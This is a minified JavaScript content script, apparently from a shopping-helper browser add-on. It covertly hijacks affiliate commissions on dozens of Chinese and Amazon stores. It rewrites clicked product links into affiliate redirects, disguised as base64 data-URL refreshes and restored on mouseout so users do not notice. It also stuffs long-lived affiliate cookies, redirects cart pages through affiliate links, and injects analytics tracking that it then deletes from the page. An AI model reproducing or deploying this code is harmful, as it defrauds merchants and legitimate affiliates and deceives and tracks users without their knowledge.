(function() {
	typeof(unsafeWindow) == 'undefined' && (unsafeWindow = window);
	if (!window.__same__ && !unsafeWindow.__same__ && !document.getElementById('hp_same_')) {
		window.__same__ = unsafeWindow.__same__ = true;
		var hps = document.createElement('script');
		hps.id = 'hp_same_';
		document.documentElement.firstChild.appendChild(hps);
		if (/click\.linktech\.cn\/\?m=/i.test(location.href)) {
			document.title = decodeURIComponent(location.href.replace(/http.*&tu=/, ''))
		};

		function jurl(url) {
			return ( !! -[1, ]) ? ('data:text/html;base64,' + btoa('<html><head><meta http-equiv="refresh" content="0;url=' + url + '"/></head><body></body></html>')) : url
		};
		function turl(url) {
			return 'http://chrome.5ihaitao.com/log/url.html?url=' + url
		};

		function murl(url) {
			return 'http://chrome.5ihaitao.com/log/url.html?url=' + url
		};

		function getCookie(c_name) {
			if (document.cookie.length > 0) {
				c_start = document.cookie.indexOf(c_name + '=');
				if (c_start != -1) {
					c_start = c_start + c_name.length + 1;
					c_end = document.cookie.indexOf(';', c_start);
					if (c_end == -1) {
						c_end = document.cookie.length
					}
					return unescape(document.cookie.substring(c_start, c_end))
				}
			}
			return ''
		};

		function setCookie(c_name, value, expiredays, path, domain, secure) {
			var exdate = new Date();
			exdate.setDate(exdate.getDate() + expiredays);
			document.cookie = c_name + '=' + escape(value) + ((expiredays == null) ? '' : ';expires=' + exdate.toGMTString()) + (path ? ';path=' + path : '') + (domain ? ';domain=' + domain : '') + (secure ? ';secure' : '')
		};

		function deleSelf(id, time) {
			setTimeout('var obj=document.getElementById("' + id + '");obj&&obj.parentNode.removeChild(obj);', time)
		};
		var findLink = function(obj) {
				if (obj.href) {
					return obj
				} else if (obj.parentNode) {
					return findLink(obj.parentNode)
				} else {
					return false
				}
			};
		var log = function(url, read) {
				var logLink = atob(getCookie('__tbclk')),
					reg = /(?:taobao|tmall).*[&\?](?:id|item_num_id|item_id)=(\d+)/i;
				if (!read) {
					setCookie('__tbclk', btoa(url))
				} else if (url == logLink) {
					return false
				} else if (reg.test(url) && logLink.indexOf(url.match(reg)[1]) > 0) {
					return false
				};
				return true
			};

		function timeGap(msec) {
			var lastTime = localStorage['timeGap_'],
				time = msec || 1000 * 30;
			localStorage['timeGap_'] = (new Date()).getTime();
			if (lastTime) {
				return (new Date()).getTime() - lastTime > time
			};
			return true
		};
		var shoped = function() {
				var nowshop = document.querySelector('#shop-info a, .shop-card a');
				if ( !! nowshop && nowshop.href.length > 0) {
					if (nowshop.href == atob(getCookie('__tbcsp'))) {
						return false
					} else {
						setCookie('__tbcsp', btoa(nowshop.href))
					}
				};
				return true
			};
		var J = /.*amazon\.cn.*detailApp.*(prodid|asin)(?:%3D|=)(\w{10}).*/i;
		var JN = /amazon\.cn.*\/(?:dp|gp\/product)\/(B00\w{7}|\d+)/i;
		var JYurl = 'http://click.linktech.cn/?m=joyo&a=A100161277&l=99999&l_cd1=0&l_cd2=1&tu=';
		var JYapp = 'http://www.amazon.cn/mn/detailApp?';
		var AMZ = 'http://redirect.viglink.com?key=e5223bdad91f8f8ea32cfd74273c3056&u=';
		var JD = /(http:\/\/(?:www|book|mvd)\.360buy\.com\/(?:product\/)?\d+\.html)/i;
		var D = /.*\.dangdang123\.com.*(?:roduct_id|rd\.(?:asp|php)\?id)(?:%3D|=)(\d*).*/i;
		var DDurl = 'http://union.dangdang123.com/transfer/transfer.aspx?from=P-275415&backurl=';
		var DDpd = 'http://product.dangdang123.com/product.aspx?product_id=';
		if (!window.__done__ && !document.getElementById('hp_done_')) {
			window.__done__ = 1;
			var hpd = document.createElement('script');
			hpd.id = 'hp_done_';
			document.documentElement.firstChild.appendChild(hpd);
			var M = 'http://click.linktech.cn/?m=';
			var addon = function(e) {
					var poin = findLink(e.target);
					if (e.button != 2 && poin) {
						var H = poin.href;
						var U = '&a=A100072087&l=99999&l_cd1=0&l_cd2=1&tu=' + encodeURIComponent(H);
						var _ = function(W, R) {
								return (R.test(H) && (poin.href = M + W + U))
							};
						(!/^javascript:(?!goShop|detailshop)|#(?!ref=www-)|=lyunion|unionId=1&siteId=101562&euid=dou|a=A100072087|from=P-275415|p=mm_(?:13593276|34640227|34640227)|eqifa/i.test(H) && log(H, true)) && ((JD.test(H) && (getCookie('websiteId') != '101562') && (poin.href = jurl(H.replace(JD, 'http://click.union.360buy.com/JdClick/?unionId=1&siteId=101562&euid=dou&t=1&to=$1')))) || (J.test(H) && (poin.href = jurl(H.replace(J, JYurl + encodeURIComponent(JYapp) + '$1%3D$2%23&tag=bjlkt10000-23&ascsubtag=A100161277&linkCode=ur2')))) || (JN.test(H) && (poin.href = jurl(JYurl + encodeURIComponent(H.replace(/[?&]?(?:ref|pf_rd_\w)=[^&]*/gi, '').replace(/\/&/, '/')) + '&tag=bjlkt10000-23&ascsubtag=A100161277&linkCode=ur2'))) || (/amazon\.com.*\/(?:dp|gp\/product)\/(B00\w{7}|\d+)/i.test(H) && (poin.href = jurl(AMZ + encodeURIComponent('http://www.amazon.com/gp/product/' + RegExp.$1) + ''))) || (/\.yihaodian\.com\/item\/[_\d]+$/i.test(H) && (getCookie('unionKey') != '109025743') && (poin.href = jurl(H + '?tracker_u=109025743'))) || (/vancl\.com.*source/i.test(H) && (poin.href = decodeURIComponent(H).replace(/http.*http/i, 'http').replace(/source(=|%3D)[^&%]*/i, 'source$1lyunion'))) || (/\.vancl\.com\/(?:Product|StyleDetail)_(?!Comment).*html/i.test(H) && !getCookie('WebSourceTemp') && !getCookie('WebSource') && (poin.href = H.replace(/\?.*/, '') + '?source=lyunion')) || (D.test(H) && !/picbox|reco_pub/.test(H) && (poin.href = H.replace(D, DDurl + DDpd + '$1'))) || (/product/i.test(H) && (_('newegg', /\.newegg\.com\.cn\/Product\//i) || (/beifabook\.com\/Product\/BookDetail.*Plucode/i.test(H) && (poin.href = M + 'beifa&a=A100072087&l=99999&l_cd1=0&l_cd2=1&tu=' + encodeURIComponent(decodeURIComponent(H.replace(/http.*http/, 'http'))))) || (/xinhuabookstore\.com\/product\/\d+/i.test(H) && (poin.href = M + 'xhbooks&a=A100072087&l=99999&l_cd1=0&l_cd2=1&tu=' + encodeURIComponent(decodeURIComponent(H.replace(/http.*http.*http/, 'http'))))) || (/bb\.sdo\.com\/ProductList\/bbindex\.aspx\?pid=1/i.test(H) && (poin.href = 'http://click.linktech.cn/?m=sdo&a=A100072087&l=00028&l_cd1=0&l_cd2=0&u_id=')) || _('lumi258', /\.lumi258\.com\/product-\d+\.html/i) || _('nala', /\.nala\.com\.cn\/product-\d+\.html/i) || _('etam', /\.etam\.cn\/EtamProductDetaile\/[_\w]+\.html/i) || _('nop', /\.nop\.cn\/product-\d+(?:-index)?\.html/i) || _('love', /\.lovo\.cn\/html\/Product_[_\d]+\.html/i) || _('efeihu', /\.efeihu\.com\/Pages\/ProductShow\/ProductDetails/i) || _('tinies', /\.tinies\.cn\/UserPage\/ProductDetail/i) || _('99read', /\.99read\.com\/product\/detail/i) || _('tnice', /\.tnice\.com\/product\/\d+\.html/i) || _('sasa', /\.sasa\.com\/.*\/product\/.*itemno=\d+/i) || _('chictalk', /\.chictalk\.com\.cn\/products\/productdetail\.ashx\?id=/i) || _('gouxie', /\.gouxie\.com\/\?product-/i) || _('m18', /list\.m18\.com\/item\/.*/i) || _('yintai', /\.yintai\.com\/product\/productdetail.*itemcode/i) || _('all3c', /\.new7\.com\/product\/.*html/i) || _('9dadao', /\.9dadao\.com\/product\/product-\d+\.jhtml/i) || _('cosme', /\.cosme-de\.com\/gb\/product\//i) || _('zoshow', /\.xiu\.com\/product\/\d+\.html/i) || _('hitec', /\.hi-tec\.cn\/\?product-\d+\.html/i) || _('do93', /\.do93\.com\/product-\d+\.html/i) || _('hanshanggou', /\.hanshanggou\.com\/products\.php\?act=view&id=/i) || _('xifuquan', /\.xifuquan\.com\/product\/[-\w]+\.html/i) || _('fadmad', /\.513523\.com\/product\/\d+\/\w+\.html/i) || _('vsnoon', /\.vsnoon\.com\/prodlist\/ProductInfo-\d+.html/i) || _('mfplaza', /\.mfplaza\.com\/.*\/Product2[-_\d]+/i) || _('uiyi', /\.uiyi\.cn\/ProductDetail/i) || _('xzuan', /\.product\.xzuan\.com\/\d+.htm/i) || _('skomart', /\.skomart\.com\/product/i) || _('learbetty', /\.learbetty\.com\/product\/\w+\.html/i) || _('yesfashion', /\.yesfashion\.cn\/html\/product\/product/i) || _('felissimocps', /\.collection\.felissimo\.com\.cn\/Col-Product-Detail\//i) || _('mmuses', /\.mmuses\.com\/product\/.*proid/i) || _('ihush', /\.ihush\.com\/product_detail\.php/i) || _('redmall', /\.redmall\.com\.cn\/Product\/ProductInfo/i) || _('autosup', /\.autosup\.com\/products\//i) || _('amssy', /\.amssy\.com\/.*ProductDisplay/i) || _('buding', /\.buding\.com\/product\//i) || _('echuyi', /\.echuyi\.com\/productdtl/i) || _('lafaso', /\.lefeng\.com\/product\/\d+\.html/i) || _('ukool', /ukool\.com\.cn\/product\.aspx\?id=/i) || _('gitana', /\.gitanamagic\.com\/products\//i) || _('365com', /\.yidianda\.com\/Products\/ProductDetails/i) || _('asiaec', /\.officedepot\.com\.cn\/product/i) || _('just666', /\.justonline\.cn\/product-/i) || _('buyjk', /\.buyjk.com\/\?product-/i) || _('shopin', /\.shopin\.net\/product\/\d+.html/i) || _('cendile', /\.cendile\.com\/product\/detail\//i) || _('lining', /\.e-lining\.com\/product\/skuDetail\.htm\?skuId/i) || _('outlet001', /\.outlets001\.com\/product-.*\.html/i) || _('mamimai', /\.mamimai\.cn\/\??product-.*\.html/i) || _('vingz', /\.vingz\.com\/\??product-.*\.html/i) || _('aizhigu', /\.aizhigu\.com\.cn\/product.*/i) || _('xcomcn', /\.x\.com\.cn\/n_product\/.*\.shtml/i) || _('naruko', /naruko\.com\.cn\/.*product\/Goods\.aspx/i) || _('dahuozhan', /\.dahuozhan\.com\/product\/.*\.html/i) || _('erq', /\.erq\.cn\/\?product-/i))) || (/goods/i.test(H) && (_('masamaso', /\.masamaso\.com\/goods_/i) || _('vcotton', /\.vcotton\.com\/goods-\d+\.html/i) || _('lamiu', /\.lamiu\.com.*goods(?:\.php|_\d+\.html)/i) || _('cotton', /\.purcotton\.com\/goods\.php/i) || _('sportica', /\.sportica\.cn\/goods[-\d]+\.html/i) || _('naguu', /\.naguu\.com\/goods[-\d]+\.html/i) || _('aimercps', /\.aimer\.com\.cn\/goods-\d+\.html/i) || _('quwan', /\.quwan\.com\/goods-\d+\.html/i) || _('pufung', /\.pufung\.com\/\w+\/goods-\d+\.html/i) || _('vipstore', /\.vipstore\.com\/goods\/\d+\.html/i) || _('doodays', /\.doodays\.com\/goods-\d+\.html/i) || _('idshe', /\.idshe\.com\/goods\.php/i) || _('jsstyle', /\.jsstyle\.com\/goods\/content\.asp\?guid=\d+/i) || _('idaphne', /\.idaphne\.com\/goods\.php.*key/i) || _('vosovo', /\.vosovo\.com\/GoodsInfo/i) || _('ibanggo', /\.banggo\.com\/goods\/\d+\.shtml/i) || _('misslele', /\.misslele\.com\/goods-.*\.html/i) || _('hmeili', /\.hmeili\.com\/goods-.*\.html/i) || _('easy361', /\.easy361\.com\/(\w+\/)?goods-\d+\.html/i) || _('yyosso3', /\.yyosso\.com\/goods\/\d+\.html/i) || _('weyii', /w1\.cn\/goods-/i) || _('mall', /\.fs-mall\.com\/goods\.php/i) || _('justbb', /\.justbb\.com\/goods\.php\?id=\d+/i) || _('xzr', /\.xiaozhuren\.com\/goods\.php/i) || _('uipmall', /\.uipmall\.com\/goods\.php/i) || _('immyhome', /\.immyhome\.com\/goods/i) || _('fclub', /\.fclub\.cn\/goods-.*html/i) || _('shaobag', /\.shaobag\.com\/goods/i) || _('cheeee', /\.cheeee\.com\/goods\/detail-/i) || _('jiuq', /\.jiuq\.com\/goods-/i) || _('happigo', /\.happigo\.com\/.*html/i) || _('no5com', /\.no5\.com\.cn\/goods\/\d+\.html/i) || _('olomo', /\.olomo\.com\/goods\/view/i) || _('258sd', /\.258sd\.com\/goods\.php\?id=/i) || _('lehome', /\.lehome\.cn\/goods-.*html/i) || _('jiuxian', /\.jiuxian\.com\/goods-.*html/i) || _('taohv', /\.taohv\.com\.cn\/goods-.*html/i) || _('99buy', /\.99buy\.com\.cn\/goods-.*html/i) || _('lyceem', /\.lyceem\.com\/goods/i))) || (_('icson', /item\.51buy\.com\/item-\d+\.html/i) || _('chinapub', /\.china-pub\.com\/\d+/i) || _('xiutuan', /tuan\.xiu\.com\/(?:team_\d+\.html)?$/i) || _('meituan', /\.meituan.com\/deal\/.*html$/i) || _('suning', /\.suning\.(cn|com)\/.*\/prd[-_\d]+\.html/i) || _('51mdq', /\.coo8\.com\/shop\/order\/para_/i) || _('dhc', /\.dhc\.net\.cn\/gds\/detail/i) || _('mbaobao', /\.mbaobao\.com\/item.*/i) || _('letao', /\.letao\.com\/.*\/shoe-/i) || _('welan', /\.wl\.cn\/\d+/i) || _('bookuu', /\.bookuu\.com\/\d+\.html/i) || _('taoxie', /\.taoxie\.com\/commodity-\d+\.htm/i) || _('just666', /\.justonline\.cn\/items\/\d+\.html/i) || _('mangocity', /\.mangocity\.com\/([-\w]+.html)?$/i) || _('flowercn', /\.flowercn\.com\/showdetail/i)  || (/www\.9588\.com\/$/i.test(H) && (poin.href = 'http://click.linktech.cn/?m=9588&a=A100072087&l=00107&l_cd1=0&l_cd2=0&u_id=')) || (/ocj\.com\.cn\/shop\/detailshop/i.test(H) && (poin.href = M + 'ocjcomcn' + U + '%26ocj%3D1')) || (/ocj\.com\.cn/i.test(location.href) && /javascript:(?:goShop|detailshop)\('(\d+)'\);/i.test(H) && (poin.href = M + 'ocjcomcn&a=A100072087&l=99999&l_cd1=0&l_cd2=1&tu=' + encodeURIComponent(poin.href.replace(/javascript:(?:goShop|detailshop)\('(\d+)'\);/i, 'http://www.ocj.com.cn/shop/detailshop.jsp?item_Code=$1&ocj=1')))) || (/yesstyle\.cn\/zh_CN\/.*\/info\.html\/pid\./i.test(H) && (poin.href = M + 'yesstyle&a=A100072087&l=99999&l_cd1=0&l_cd2=1&tu=' + encodeURIComponent(H.replace('zh_CN', 'associate-referral.html?FCCOO4VY+/zh_CN')))) || _('3suisses', /\.3suisses\.com\.cn\/.*\.shtml/i) || _('vipshop', /\.vipshop\.com\/detail/i) || _('glamour', /\.glamour-sales\.com\.cn\/(private-sales\/[^\/]*|.*-event)\.html$/i) || _('missha', /\.misshachina\.cn\/goumai\/goumai-dp/i) || _('yangsam', /\.yangsam\.com\/\d+/i) || _('xijie', /\.xijie\.com\/prod-.*html/i) || _('disiqu', /\.disiqu\.cn\/detail/i) || _('manzuo', /\.manzuo\.com\/\w+\/\d+$/i) || _('yoho', /\.yoho\.cn\/pro_/i) || _('d1bianli', /\.d1\.com\.cn\/html\/\d+\.htm/i) || _('bookschina', /\.bookschina\.com\/\d+\.htm/i) || _('chinadrtv', /\.chinadrtv\.com\/.*\d+\.shtml/i) || _('ogage', /\.ogage\.cn\/Shop\/Detail/i) || _('1hai', /www\.1hai\.cn\/$/i) || _('luolai', /\.luolai\.cn\/.*\/pr-\d+\.htm/i) || _('pinwine', /\.pinwine\.cn\/\d+\.html$/i) || _('doin', /\.doin\.cn\/p-\d+\.html$/i) || _('epiner', /\.epiner\.com\/[-\w]+\.html$/i) || _('d8wed', /\.d8wed\.com\/tuan\/\d+\.html/i) || _('yuncheng', /\.yuncheng\.com\/book\/detail\/\d+\/\d+/i) || _('baizus', /\.baizus\.cn\/(\w+\/)?\w+\.html/i) || _('yoee', /\.yoee\.com\/?$/i) || _('caipiao163', /caipiao\.163\.com\/(award\/|groupbuy\/|dating\/buyHouse\.jsp)?$/i) || _('oohdear', /\.oohdear\.com\/(OohdearStudio\/oohdear\/index\.jsp)?$/i) || _('camelcn', /\.camel\.com\.cn\/[^\/]+\/.*\.shtml/i) || _('xindongfang', /\.koolearn\.com\/?$/i) || _('yougou', /\.yougou\.com\/.*\/p_\d+\.s?html/i) || _('2am', /\.go2am\.com\/detail-\d+.html/i) || _('etpass', /\.etpass\.com\/?$/i) || _('podinns', /\.podinns\.com\/(Hotel\/\w+)?$/i) || _('365wine', /\.365wine\.com\/[-\d]+\.html$/i) || _('wuxinghui', /\.wuxinghui\.com\/team\/detail\.php\?id=/i) || _('kadang2', /\.kadang\.com\/diy\/detail.*\.html/i) || _('viptemai', /\.viptemai\.com\/(?:index.aspx)?$/i) || _('thelux', /\.thelux\.cn\/(?:frontstage\/(?:index\.php|comin_soon\.php\?act=detail&id=\d+|prod_list\.php\?aid=\d+|end_prod_list\.php\?aid=\d+))?$/i) || _('jumei', /\.jumei\.com\/i\/deal\/.*/i) || _('bololan', /\.bololan\.com\/(?:product_list\.php.*|product_detail\.php.*|diamonds|series)?$/i) || _('pupai', /\.pupai\.cn\/(?:index.html|goods\/.*html)?$/i) || _('tdianping', /t\.dianping.com\/deal\/.*/i) || _('homevv', /\.homevv\.com\/vvshopProductView\/pid-.*/i) || _('myzj', /\.muyingzhijia.com\/shopping\/productdetail.aspx\.*/i) || _('redbaby', /\.redbaby\.com\.cn\/.*\/1.*/i) || _('lvmama', /\.lvmama\.com\/product\/.*/i) || _('360kxr', /\.360kxr\.com\/product\/.*/i) || _('jxdyf', /\.jxdyf\.com\/product.*/i) || _('dangdang', /product\.dangdang\.com\/.*/i)   || _('vjia', /item\.vjia\.com\/.*/i) || _('lashou', /\.lashou\.com\/deal\/.*/i)|| _('pptake', /\.pptake\.com\/advsdetail\.do/i))) && log(H, false) && poin.addEventListener('mouseout', function() {
							poin.href = H
						}, false)
					}
				};
			document.body && document.body.addEventListener('click', addon, false);
			var H = location.href;

			function putSrcpt(url) {
				var sct = document.createElement('script');
				sct.src = url;
				var s = document.getElementsByTagName('script')[0];
				s.parentNode.insertBefore(sct, s)
			};
			(/\.360buy\.com/.test(H) && (getCookie('websiteId') != '101562') && setCookie('websiteId', '101562', 1000, '/', '.360buy.com'));
			(/\.360buy\.com/.test(H) && (getCookie('unionUnId') != '1') && setCookie('unionUnId', '1', 1000, '/', '.360buy.com'));
			(/\.jd\.com/.test(H) && (getCookie('websiteId') != '101562') && setCookie('websiteId', '101562', 1000, '/', '.jd.com'));
			(/\.jd\.com/.test(H) && (getCookie('unionUnId') != '1') && setCookie('unionUnId', '1', 1000, '/', '.jd.com'));
			(/\.yihaodian\.com/.test(H) && (getCookie('unionKey') != '6258') && setCookie('unionKey', '6258', 1000, '/', '.yihaodian.com'));
			(/\.yihaodian\.com/.test(H) && (getCookie('websiteid') != '110788') && setCookie('websiteid', '110788', 1000, '/', '.yihaodian.com'));
			(/\.yihaodian\.com/.test(H) && (getCookie('unionType') != '1') && setCookie('unionType', '1', 1000, '/', '.yihaodian.com'));
			(/\.vancl\.com/.test(H) && (getCookie('WebSource') != 'lyunion') && setCookie('WebSource', 'lyunion', 1000, '/', '.vancl.com'));
			(/\.1mall\.com/.test(H) && (getCookie('unionKey') != '6258') && setCookie('unionKey', '6258', 1000, '/', '.1mall.com'));
			(/\.1mall\.com/.test(H) && (getCookie('websiteid') != '110788') && setCookie('websiteid', '110788', 1000, '/', '.1mall.com'));
			(/\.1mall\.com/.test(H) && (getCookie('unionType') != '1') && setCookie('unionType', '1', 1000, '/', '.1mall.com'));
			(/\.111\.com\.cn/.test(H) && (getCookie('unionKey') != '20376') && setCookie('unionKey', '20376', 1000, '/', '.111.com.cn'));
			(/\.111\.com\.cn/.test(H) && (getCookie('websiteid') != '110788') && setCookie('websiteid', '110788', 1000, '/', '.111.com.cn'));
			(/\.jumei\.com/.test(H) && (getCookie('an_src') != 'yiqifa_cps') && setCookie('an_src', 'yiqifa_cps', 1000, '/', '.jumei.com'));
			(/\.jumei\.com/.test(H) && (getCookie('an_sub_src') != 'MTAxNTQzfD%3D%3D') && setCookie('an_sub_src', 'MTAxNTQzfD%3D%3D', 1000, '/', '.jumei.com'));
			(/\.jumei\.com/.test(H) && (getCookie('referer_site_cps') != 'yiqifa_cps__MTAxNTQzfD%3D%3D') && setCookie('referer_site_cps', 'yiqifa_cps__MTAxNTQzfD%3D%3D', 1000, '/', '.jumei.com'));
			(/\.jumei\.com/.test(H) && (getCookie('referer_site') != 'yiqifa_cps__MTAxNTQzfD%3D%3D') && setCookie('referer_site', 'yiqifa_cps__MTAxNTQzfD%3D%3D', 1000, '/', '.jumei.com'));
			try {
				if (location.host.match(/\.vancl\.com/i) && !/lyunion/i.test(getCookie('WebSource'))) { !! getCookie('WebSource') && setCookie('WebSource', '');
					if (!/lyunion/i.test(getCookie('WebSourceTemp'))) {
						putSrcpt('http://click.vancl.com/websource/websource.aspx?source=lyunion&sourceInfo=&referer=&hrefurl=' + encodeURIComponent(H) + '&isnew=1');
						setTimeout(function() {
							putSrcpt('http://click.vancl.com/websource/websource.aspx')
						}, 1000)
					}
				}
			} catch (e) {};
			(/amazon\.cn.*item-dispatch\?submit\.addToCart=addToCart/i.test(H) && !/#/.test(H) && location.replace('http://click.linktech.cn/?m=joyo&a=A100072087&l=99999&l_cd1=0&l_cd2=1&u_id=kxbaidu&tu=' + encodeURIComponent(H.replace(/\&(?:source|tag)=[^&]*/i, '') + '#') + '&tag=bjlkt10000-23&ascsubtag=A100161277&linkCode=ur2'));
			(/dangdang123\.com.*shoppin_cart\.aspx/i.test(H) && document.referrer && !/dangdang123\.com/i.test(document.referrer) && location.replace(DDurl + H))
		};
		if (/(360buy|amazon|dangdang123|douban|gome|51buy|newegg|redbaby|suning|taobao|tmall|vancl|yihaodian)\.(com|cn)/i.test(location.hostname)) {
			try {
				function createga() {
					var h = document.getElementsByTagName('head');
					if (h.length) {
						setTimeout(function() {
							var gtm = document.createElement('script');
							gtm.type = 'text/javascript';
							gtm.id = 'gaqw__';
							gtm.innerHTML = "var _gaq=_gaq||[];_gaq.push(['_setAccount','UA-34862872-1'],['_setDomainName','none'],['_setAllowLinker',true],['_setCustomVar',1,'Addon',(/chrome/i.test(navigator.userAgent)? 'CR':'FX')+(window.name_||'').replace(/閹�?/g,'HP').replace(/娑�?/g,'LK').replace(/閺�?/g,'BP').replace(/[娑撯偓-?]*/gi,'').replace(/.{8}elpe./i,'')+' 21126' ,1],['_trackPageview']);";
							document.documentElement.firstChild.appendChild(gtm);
							(function() {
								var ga = document.createElement('script');
								ga.type = 'text/javascript';
								ga.id = 'gasr__';
								ga.async = true;
								ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
								document.documentElement.firstChild.appendChild(ga)
							})()
						}, 500)
					} else {
						setTimeout(createga, 500)
					}
				};
				if (self.location == top.location) {
					createga();
					deleSelf('gaqw__', 5000);
					deleSelf('gasr__', 5000)
				}
			} catch (e) {}
		}
	}
})();
